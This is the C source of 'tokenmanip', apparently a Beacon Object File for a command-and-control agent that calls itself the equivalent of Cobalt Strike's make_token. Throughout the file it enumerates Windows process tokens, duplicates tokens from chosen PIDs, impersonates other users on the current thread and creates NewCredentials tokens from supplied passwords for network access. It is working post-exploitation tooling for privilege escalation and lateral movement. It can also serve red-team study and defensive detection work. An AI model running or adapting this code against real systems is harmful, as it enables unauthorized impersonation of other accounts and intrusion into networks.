/*
 * tokenmanip.c — Token theft, impersonation, and creation
 *
 * Actions:
 *   list        — Enumerate tokens from all accessible processes
 *   steal <pid> — Duplicate token from target PID
 *   impersonate <pid> — Steal + impersonate in current thread
 *   revert      — RevertToSelf (drop impersonation)
 *   make <user> <pass> — Create new token via LogonUserW
 *   whoami      — Show current thread/process token identity
 *
 * Win32 APIs:
 *   ntdll:    NtQuerySystemInformation (process listing without per-PID OpenProcess)
 *   advapi32: OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser,
 *             RevertToSelf, GetTokenInformation, LookupAccountSidW,
 *             LogonUserW, SetThreadToken, LookupPrivilegeNameW
 *   kernel32: OpenProcess, CloseHandle, GetCurrentProcess
 */
#include <windows.h>
#include "beacon_compat.h"

/* ── Imports ── */
DECLSPEC_IMPORT DWORD  NTAPI    NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, PVOID, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$SetThreadToken(PHANDLE, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$LookupPrivilegeNameW(LPCWSTR, PVOID, LPWSTR, LPDWORD);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$LogonUserW(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$CheckTokenMembership(HANDLE, PSID, PBOOL);
DECLSPEC_IMPORT BOOL   WINAPI   ADVAPI32$AllocateAndInitializeSid(PVOID, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID*);
DECLSPEC_IMPORT PVOID  WINAPI   ADVAPI32$FreeSid(PSID);

DECLSPEC_IMPORT HANDLE WINAPI   KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI   KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI   KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI   KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT int    WINAPI   KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT int    WINAPI   KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT LPVOID WINAPI   KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI   KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT DWORD  WINAPI   KERNEL32$GetLastError(void);

DECLSPEC_IMPORT int    __cdecl  MSVCRT$strcmp(const char*, const char*);
DECLSPEC_IMPORT int    __cdecl  MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void*  __cdecl  MSVCRT$memcpy(void*, const void*, size_t);

/* ── Constants (guarded to avoid redefinition with MinGW headers) ── */
#ifndef SystemProcessInformation
#define SystemProcessInformation         5
#endif
#ifndef TOKEN_QUERY
#define TOKEN_QUERY                      0x0008
#endif
#ifndef TOKEN_DUPLICATE
#define TOKEN_DUPLICATE                  0x0002
#endif
#ifndef TOKEN_IMPERSONATE
#define TOKEN_IMPERSONATE                0x0004
#endif
#ifndef TOKEN_ASSIGN_PRIMARY
#define TOKEN_ASSIGN_PRIMARY             0x0001
#endif
#ifndef TOKEN_ALL_ACCESS
#define TOKEN_ALL_ACCESS                 0x000F01FF
#endif
#define MY_TokenUser                     1
#define MY_TokenGroups                   2
#define MY_TokenPrivileges               3
#define MY_TokenIntegrityLevel           25
#define MY_TokenStatistics               10
#define MY_SecurityImpersonation         2
#define MY_TokenPrimary                  1
#define MY_TokenImpersonation            2
#ifndef PROCESS_QUERY_INFORMATION
#define PROCESS_QUERY_INFORMATION        0x0400
#endif
#ifndef PROCESS_QUERY_LIMITED_INFORMATION
#define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
#endif
#ifndef LOGON32_LOGON_NEW_CREDENTIALS
#define LOGON32_LOGON_NEW_CREDENTIALS    9
#endif
#ifndef LOGON32_PROVIDER_WINNT50
#define LOGON32_PROVIDER_WINNT50         3
#endif
#ifndef MEM_COMMIT
#define MEM_COMMIT                       0x1000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE                      0x2000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE                      0x8000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE                   0x04
#endif
#ifndef SE_PRIVILEGE_ENABLED
#define SE_PRIVILEGE_ENABLED             0x00000002
#endif

#define SECURITY_NT_AUTHORITY_ID {{0,0,0,0,0,5}}
#ifndef SECURITY_BUILTIN_DOMAIN_RID
#define SECURITY_BUILTIN_DOMAIN_RID      32
#endif
#ifndef DOMAIN_ALIAS_RID_ADMINS
#define DOMAIN_ALIAS_RID_ADMINS          544
#endif

/* ── Token info structs ── */
typedef struct {
    DWORD PrivilegeCount;
    /* followed by PrivilegeCount LUID_AND_ATTRIBUTES */
} MY_TOKEN_PRIVILEGES;

typedef struct {
    LARGE_INTEGER Luid;
    DWORD         Attributes;
} MY_LUID_AND_ATTRIBUTES;

/*
 * Get username from a token handle. Returns "DOMAIN\user" in out buffer.
 */
static void get_token_user(HANDLE hToken, char *out, int outLen) {
    BYTE buf[256];
    DWORD needed = 0;
    out[0] = 0;

    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
        return;

    /* TOKEN_USER: first field is a SID_AND_ATTRIBUTES, SID pointer at offset 0 */
    PSID pSid = *(PSID*)buf;

    wchar_t name[128] = {0}, domain[128] = {0};
    DWORD nameLen = 128, domLen = 128;
    DWORD sidUse = 0;

    if (ADVAPI32$LookupAccountSidW(NULL, pSid, name, &nameLen, domain, &domLen, &sidUse)) {
        char aName[128], aDomain[128];
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, name, -1, aName, 128, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, domain, -1, aDomain, 128, NULL, NULL);

        int pos = 0;
        for (int i = 0; aDomain[i] && pos < outLen - 2; i++)
            out[pos++] = aDomain[i];
        out[pos++] = '\\';
        for (int i = 0; aName[i] && pos < outLen - 1; i++)
            out[pos++] = aName[i];
        out[pos] = 0;
    }
}

/*
 * Get integrity level string from token
 */
static const char* get_integrity(HANDLE hToken) {
    BYTE buf[64];
    DWORD needed = 0;

    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenIntegrityLevel, buf, sizeof(buf), &needed))
        return "???";

    /* TOKEN_MANDATORY_LABEL: SID_AND_ATTRIBUTES at offset 0 */
    PSID pSid = *(PSID*)buf;
    /* Integrity RID is the last sub-authority */
    DWORD *subAuth = (DWORD*)((BYTE*)pSid + 8 + (((BYTE*)pSid)[1] - 1) * 4);
    /* The sub-authority count is at offset 1 of SID */
    DWORD rid = *subAuth;

    if (rid >= 0x4000) return "SYSTEM";
    if (rid >= 0x3000) return "HIGH";
    if (rid >= 0x2000) return "MEDIUM";
    return "LOW";
}

/*
 * Check if token is elevated (member of Administrators)
 */
static BOOL is_admin_token(HANDLE hToken) {
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY_ID;
    PSID adminSid = NULL;
    BOOL isAdmin = FALSE;

    if (ADVAPI32$AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminSid)) {
        ADVAPI32$CheckTokenMembership(hToken, adminSid, &isAdmin);
        ADVAPI32$FreeSid(adminSid);
    }
    return isAdmin;
}

/*
 * ACTION: list — Enumerate tokens from all running processes
 */
static void do_list(void) {
    ULONG bufSize = 1024 * 1024;
    PVOID buffer = KERNEL32$VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed\n");
        return;
    }

    ULONG retLen = 0;
    DWORD status;
    while ((status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buffer, bufSize, &retLen))
            == 0xC0000004) { /* STATUS_INFO_LENGTH_MISMATCH */
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        bufSize = retLen + 4096;
        buffer = KERNEL32$VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return;
    }

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtQuerySystemInformation failed: 0x%08x\n", status);
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n  %-8s %-8s %-30s %-10s %-6s %-s\n"
        "  %-8s %-8s %-30s %-10s %-6s %-s\n",
        "PID", "PPID", "User", "Integrity", "Admin", "Process",
        "---", "----", "----", "---------", "-----", "-------");

    BYTE *current = (BYTE*)buffer;
    int count = 0;

    while (1) {
        DWORD nextOffset = *(DWORD*)(current + 0x00);
        DWORD pid        = (DWORD)(*(ULONG_PTR*)(current + 0x48));
        DWORD ppid       = (DWORD)(*(ULONG_PTR*)(current + 0x50));

        /* Read UNICODE_STRING for process name */
        USHORT nameLen   = *(USHORT*)(current + 0x38);
        wchar_t *nameBuf = *(wchar_t**)(current + 0x38 + sizeof(ULONG_PTR));
        char procName[128] = "[System]";
        if (nameLen > 0 && nameBuf) {
            KERNEL32$WideCharToMultiByte(CP_UTF8, 0, nameBuf, nameLen / 2,
                                         procName, 127, NULL, NULL);
            procName[nameLen / 2] = 0;
        }

        /* Skip PID 0 (Idle) */
        if (pid == 0) goto next;

        /* Try to open the process token */
        HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProc)
            hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

        if (hProc) {
            HANDLE hToken = NULL;
            if (ADVAPI32$OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
                char user[256] = {0};
                get_token_user(hToken, user, sizeof(user));
                const char *integrity = get_integrity(hToken);
                BOOL admin = is_admin_token(hToken);

                BeaconPrintf(CALLBACK_OUTPUT, "  %-8u %-8u %-30s %-10s %-6s %s\n",
                    pid, ppid, user[0] ? user : "???",
                    integrity, admin ? "YES" : "no", procName);
                count++;

                KERNEL32$CloseHandle(hToken);
            }
            KERNEL32$CloseHandle(hProc);
        }

next:
        if (nextOffset == 0) break;
        current += nextOffset;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Enumerated %d accessible tokens\n", count);
    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
}

/*
 * ACTION: steal — Duplicate a token from target PID
 * Returns the duplicated token handle (caller must close)
 */
static HANDLE do_steal(DWORD targetPid) {
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProc) {
        hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);
    }
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess(%u) failed: %u\n",
                     targetPid, KERNEL32$GetLastError());
        return NULL;
    }

    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(hProc,
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcessToken(%u) failed: %u\n",
                     targetPid, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProc);
        return NULL;
    }

    /* Duplicate as impersonation token */
    HANDLE hDup = NULL;
    if (!ADVAPI32$DuplicateTokenEx(hToken,
            TOKEN_ALL_ACCESS, NULL,
            MY_SecurityImpersonation,  /* impersonation level */
            MY_TokenImpersonation,     /* token type */
            &hDup)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] DuplicateTokenEx failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProc);
        return NULL;
    }

    char user[256] = {0};
    get_token_user(hDup, user, sizeof(user));
    const char *integrity = get_integrity(hDup);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Token stolen from PID %u\n"
        "    User:      %s\n"
        "    Integrity: %s\n"
        "    Admin:     %s\n",
        targetPid, user, integrity,
        is_admin_token(hDup) ? "YES" : "no");

    KERNEL32$CloseHandle(hToken);
    KERNEL32$CloseHandle(hProc);

    return hDup;
}

/*
 * ACTION: impersonate — Steal token and impersonate on current thread
 */
static void do_impersonate(DWORD targetPid) {
    HANDLE hDup = do_steal(targetPid);
    if (!hDup) return;

    if (!ADVAPI32$ImpersonateLoggedOnUser(hDup)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateLoggedOnUser failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hDup);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Now impersonating token from PID %u\n"
        "[*] Use 'tokenmanip --action revert' to drop impersonation\n",
        targetPid);

    /* Don't close hDup — the impersonation thread holds a reference.
     * It will be released when we RevertToSelf or the thread exits.
     * NOTE: In a real agent, we'd store this handle in the agent's
     * token stack for proper cleanup. The agent's TokenOps native
     * module manages this. For the BOF, the token persists until revert. */
}

/*
 * ACTION: revert — Drop impersonation, return to original token
 */
static void do_revert(void) {
    if (!ADVAPI32$RevertToSelf()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RevertToSelf failed: %u\n",
                     KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Reverted to original process token\n");

    /* Show who we are now */
    HANDLE hToken = NULL;
    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        char user[256] = {0};
        get_token_user(hToken, user, sizeof(user));
        BeaconPrintf(CALLBACK_OUTPUT, "    Current user: %s\n", user);
        KERNEL32$CloseHandle(hToken);
    }
}

/*
 * ACTION: make — Create a new token via LogonUserW (type 9 = NewCredentials)
 * This is the equivalent of Cobalt Strike's "make_token".
 * The token has the identity of the specified user for NETWORK access
 * but retains the current user's identity for LOCAL access.
 */
static void do_make(const char *username, const char *password) {
    if (!username || !*username || !password || !*password) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: tokenmanip --action make --username DOMAIN\\user --password pass\n");
        return;
    }

    /* Split DOMAIN\user */
    wchar_t wUser[256] = {0}, wDomain[256] = {0}, wPass[256] = {0};
    wchar_t wFull[512] = {0};
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, username, -1, wFull, 512);
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, password, -1, wPass, 256);

    /* Find backslash separator */
    int splitPos = -1;
    for (int i = 0; wFull[i]; i++) {
        if (wFull[i] == L'\\') { splitPos = i; break; }
    }

    if (splitPos > 0) {
        MSVCRT$memcpy(wDomain, wFull, splitPos * sizeof(wchar_t));
        wDomain[splitPos] = 0;
        int j = 0;
        for (int i = splitPos + 1; wFull[i]; i++)
            wUser[j++] = wFull[i];
        wUser[j] = 0;
    } else {
        /* No domain specified — use "." for local */
        wDomain[0] = L'.'; wDomain[1] = 0;
        MSVCRT$memcpy(wUser, wFull, 256 * sizeof(wchar_t));
    }

    HANDLE hToken = NULL;
    /* LOGON32_LOGON_NEW_CREDENTIALS (9): token has current user locally,
       specified user for network auth. No validation against DC needed. */
    if (!ADVAPI32$LogonUserW(wUser, wDomain, wPass,
            LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LogonUserW failed: %u\n",
                     KERNEL32$GetLastError());
        return;
    }

    if (!ADVAPI32$ImpersonateLoggedOnUser(hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateLoggedOnUser failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Token created and applied (logon type 9: NewCredentials)\n"
        "    Network identity: %s\n"
        "    Local identity:   unchanged (current process user)\n"
        "[*] Network operations (SMB, LDAP, RPC) will use the new credentials\n"
        "[*] Use 'tokenmanip --action revert' to drop\n",
        username);
}

/*
 * ACTION: whoami — Show current thread/process token details
 */
static void do_whoami(void) {
    HANDLE hToken = NULL;

    /* Try thread token first (impersonated) */
    BOOL impersonating = FALSE;
    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentThread(),
            TOKEN_QUERY, &hToken)) {
        /* Actually need OpenThreadToken but we don't import it.
         * We'll check the process token and note if impersonating. */
        KERNEL32$CloseHandle(hToken);
        hToken = NULL;
    }

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcessToken failed: %u\n",
                     KERNEL32$GetLastError());
        return;
    }

    char user[256] = {0};
    get_token_user(hToken, user, sizeof(user));
    const char *integrity = get_integrity(hToken);
    BOOL admin = is_admin_token(hToken);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Current Token Info:\n"
        "    User:      %s\n"
        "    Integrity: %s\n"
        "    Admin:     %s\n",
        user, integrity, admin ? "YES" : "no");

    /* List privileges */
    BYTE privBuf[1024];
    DWORD privNeeded = 0;
    if (ADVAPI32$GetTokenInformation(hToken, MY_TokenPrivileges, privBuf, sizeof(privBuf), &privNeeded)) {
        MY_TOKEN_PRIVILEGES *tp = (MY_TOKEN_PRIVILEGES*)privBuf;
        MY_LUID_AND_ATTRIBUTES *privs = (MY_LUID_AND_ATTRIBUTES*)(privBuf + 4);

        BeaconPrintf(CALLBACK_OUTPUT, "\n    Privileges (%u):\n", tp->PrivilegeCount);
        for (DWORD i = 0; i < tp->PrivilegeCount && i < 40; i++) {
            wchar_t privName[128] = {0};
            DWORD privNameLen = 128;
            if (ADVAPI32$LookupPrivilegeNameW(NULL, &privs[i].Luid, privName, &privNameLen)) {
                char aPriv[128] = {0};
                KERNEL32$WideCharToMultiByte(CP_UTF8, 0, privName, -1, aPriv, 128, NULL, NULL);
                BOOL enabled = (privs[i].Attributes & SE_PRIVILEGE_ENABLED) != 0;
                BeaconPrintf(CALLBACK_OUTPUT, "      %-40s %s\n",
                    aPriv, enabled ? "ENABLED" : "DISABLED");
            }
        }
    }

    KERNEL32$CloseHandle(hToken);
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *action   = BeaconDataExtract(&parser, NULL);
    int   pid      = BeaconDataInt(&parser);
    char *username = BeaconDataExtract(&parser, NULL);
    char *password = BeaconDataExtract(&parser, NULL);

    if (!action || !*action) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Usage: tokenmanip --action <list|steal|impersonate|revert|make|whoami> [--pid PID] [--username USER --password PASS]\n");
        return;
    }

    if (MSVCRT$strcmp(action, "list") == 0) {
        do_list();
    }
    else if (MSVCRT$strcmp(action, "steal") == 0) {
        if (pid == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] --pid required for steal\n");
            return;
        }
        HANDLE hDup = do_steal((DWORD)pid);
        if (hDup) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Token handle obtained. Use 'impersonate' to apply it.\n");
            /* In a real agent, we'd store this in the token stack.
             * For the BOF, we close it since we can't persist handles. */
            KERNEL32$CloseHandle(hDup);
        }
    }
    else if (MSVCRT$strcmp(action, "impersonate") == 0) {
        if (pid == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] --pid required for impersonate\n");
            return;
        }
        do_impersonate((DWORD)pid);
    }
    else if (MSVCRT$strcmp(action, "revert") == 0) {
        do_revert();
    }
    else if (MSVCRT$strcmp(action, "make") == 0) {
        do_make(username, password);
    }
    else if (MSVCRT$strcmp(action, "whoami") == 0) {
        do_whoami();
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown action: %s\n", action);
        BeaconPrintf(CALLBACK_ERROR, "[!] Valid: list, steal, impersonate, revert, make, whoami\n");
    }
}
